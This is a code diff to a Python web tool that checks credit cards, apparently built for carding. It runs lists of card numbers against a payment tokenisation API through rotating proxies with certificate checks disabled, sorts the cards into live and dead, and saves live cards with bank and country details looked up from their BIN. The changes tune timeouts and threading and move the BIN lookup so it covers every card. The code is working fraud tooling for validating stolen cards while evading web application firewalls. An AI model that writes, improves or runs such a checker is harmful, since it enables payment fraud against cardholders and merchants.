@@ -493,10 +493,6 @@ class WebProxyPool:
         return {"http": p, "https": p}
 
 class DynamicTokenManager:
-    """
-    EXACT ORIGINAL TOKEN FLOW PERO WALANG DEADLOCK:
-    Kumukuha ng fresh token gamit ang sariling session nang hindi bina-block ang ibang threads.
-    """
     def __init__(self, initial_token, proxy_pool):
         self.token = initial_token
         self.proxy_pool = proxy_pool
@@ -618,11 +614,11 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
             headers=headers, 
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
+            return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)"
         
         keys = r.json().get("list", [])
         if not keys:
@@ -648,7 +644,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
                 "save_card": False
             },
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         
@@ -669,7 +665,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
             headers=headers,
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         
@@ -689,7 +685,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
 
     except Exception as e:
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
-        return 2, "ERROR", err_msg or "Exception"
+        return 2, "ERROR", err_msg[:50] or "Timeout"
     finally:
         try:
             session.close()
@@ -718,7 +714,7 @@ def background_worker(cards, proxies_list, max_threads):
                 valid_proxies.append(p_str)
         
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
-        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
+        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)} active. Starting..."})
     else:
         proxy_pool = None
         checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
@@ -732,26 +728,25 @@ def background_worker(cards, proxies_list, max_threads):
             return
         
         code, status, detail = check_single_card(card, proxy_pool, token_manager)
+        bin_code = card.split("|")[0].strip()[:6]
+        bin_meta = {}
+        try:
+            b_res = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3).json()
+            if b_res and b_res.get("success"):
+                bin_meta = {
+                    "scheme": (b_res.get("scheme") or "VISA/MC").upper(),
+                    "type": (b_res.get("type") or "CREDIT").upper(),
+                    "bank": b_res.get("bank", {}).get("name", "Unknown Bank"),
+                    "country": f"{b_res.get('country', {}).get('emoji', '')} {b_res.get('country', {}).get('name', 'Unknown')}"
+                }
+        except Exception:
+            pass
         
         with counts_lock:
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
-                bin_code = card.split("|")[0].strip()[:6]
-                bin_meta = {}
-                try:
-                    b_res = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3).json()
-                    if b_res and b_res.get("success"):
-                        bin_meta = {
-                            "scheme": (b_res.get("scheme") or "VISA/MC").upper(),
-                            "type": (b_res.get("type") or "CREDIT").upper(),
-                            "bank": b_res.get("bank", {}).get("name", "Unknown Bank"),
-                            "country": f"{b_res.get('country', {}).get('emoji', '')} {b_res.get('country', {}).get('name', 'Unknown')}"
-                        }
-                except Exception:
-                    pass
                 save_live_card(card, detail, bin_meta)
-
             elif code == 1:
                 counts["dead"] += 1
             else:
@@ -765,9 +760,9 @@ def background_worker(cards, proxies_list, max_threads):
                 **counts
             })
 
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+    with ThreadPoolExecutor(max_workers=max(1, int(max_threads))) as executor:
         futures = [executor.submit(worker_task, card) for card in cards]
-        for _ in as_completed(futures):
+        for future in as_completed(futures):
             if checker_stop_event.is_set():
                 break
 
@@ -807,10 +802,6 @@ def api_checker_stop():
 
 @app.route('/api/checker/poll')
 def api_checker_poll():
-    """
-    NON-BLOCKING BATCH POLL ENDPOINT:
-    Kumukuha ng lahat ng available card results sa queue sa isang iglap nang hindi bina-block ang Gunicorn worker.
-    """
     items = []
     while not checker_queue.empty() and len(items) < 50:
         try:
